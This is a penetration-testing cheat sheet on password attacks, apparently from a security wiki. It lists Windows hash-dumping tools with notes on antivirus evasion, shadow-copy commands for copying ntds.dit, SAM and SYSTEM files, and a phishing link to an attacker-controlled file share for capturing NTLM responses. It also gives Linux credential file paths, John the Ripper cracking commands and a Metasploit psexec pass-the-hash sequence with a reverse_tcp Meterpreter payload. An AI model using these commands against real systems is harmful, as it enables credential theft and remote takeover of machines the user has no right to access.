---
title: Password Attacks and Bruteforce
category: Exploitation
order: 98
---
 
> **Obtain Windows Passswords**
Pwdump (File Dropped to Disk Caught by AV) | http://www.tarasco.org/security/pwdump_7/
fgdump (File Dropped to Disk Caught by AV, Source available to evade AV) | http://foofus.net/goons/fizzgig/fgdump/downloads.htm#previous-version
Other versions of pwdump | http://www.openwall.com/passwords/windows-pwdump
Metasploit hashdump | <code> meterpreter >hashdump (from memory) <br> meterpreter > run hashdump (hash and syskey from registry) </code>
Mimikatz | https://github.com/gentilkiwi/mimikatz
	
**Volume Shadow Copy Service (domain controller)**
{% highlight bash %}
cscript vssown.vbs /status or /start or /create /c
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy[X]\windows\ntds\ntds.dit ntdsbackup.dit 
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy[X]\windows\system32\config\SYSTEM systembackup.bak
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy[X]\windows\system32\config\SAM sambackup.bak

Analyze with ntds Dump Hash
{% endhighlight %}

**Tools**
* [vssown vbs](https://github.com/lanmaster53/ptscripts/blob/master/windows/vssown.vbs)  
* [vssown py](https://github.com/MarkBaggett/MarkBaggett/blob/master/vssown.py)
* [ntds Dump Hash](http://csabarta.com/downloads/ntds_dump_hash.zip)

**Sniff (Kannan, ntlm, ms kerberos)**
{% highlight bash %}
E-mail with link: file://[AttackerIP]/[AttackerShare]
Sniff the traffic between victim and client for challange and response
{% endhighlight %}

> **Linux Password Locations** 

Users and Passwords:

* /etc/passwd and /etc/shadow

Network or WiFi Passwords:

* /etc/NetworkManager/system-connections

Gnome Keyring:

* ~/.gnome/keyrings

> **Mac OS X Bruteforce** 

Mac OS X:

* [crowbarKC](http://www.ibootstup.com/app/com.georgestarcher.crowbarkc)

> **CISCO Group Password**

From Kali:<br>
<code>cisco-decrypt (GroupPassword)</code>

> **Password Guessing**

Hyrda

> **Memory Image**

<code> vol.py -f system_image.vmem --profile=Win7SP1x64 mimikatz </code>

> **Rainbow Tables**

* http://project-rainbowcrack.com
* http://souceforce.net/projects/ophcrack
* http://lasecwww.epfl.ch/~oechslin/projects/ophcrack

> **Password Cracking Tools**

**GPU**

* MD5 Cracker: http://bvernoux.free.fr/md5/index.php
* oclHashcat  and Hashcat (same project)
* CUDA-multiforcer
* aircrack-ng-CUDA
* pyrit (WPA and WPA w/ CoWPAtty)

**CPU**

* John
* Cain (note: wordlist is located at C:\Program file\Cain\Wordlist\Wordlist.txt)

> **John the Ripper**

View Cracked Passwords | <code> ./john --show [password file] </code>
Pause a session | CTRL-C
Kill a session | <code> CTRL-C twice quickly </code>
Restore a session | <code> ./john --restore </code>
Current Status | any key
Customize Session based on password policy (e.g., length) | edit john.conf (Linux) and john.ini (windows)
Combine Shadow and passwd | <code> ./unshadow passwd_copy shadow_copy > combined.txt </code>
Password length Customization | <code> MinLen and MaxLen <code>

> **Pass the Hash**

***May require RID 500 account due to patch***
	
Windows credential editor | www.ampliasecurity.com/research
Metasploit psexec| <code> use exploit/windows/smb/psexec <br> set RHOST [victim] <br> set PAYLOAD windows/meterpreter/reverse_tcp <br> 	set SMBUser [admin_name]  <br> set SMBPass [admin_hash] <br> exploit </code> 
Nmap nse smb | tbd


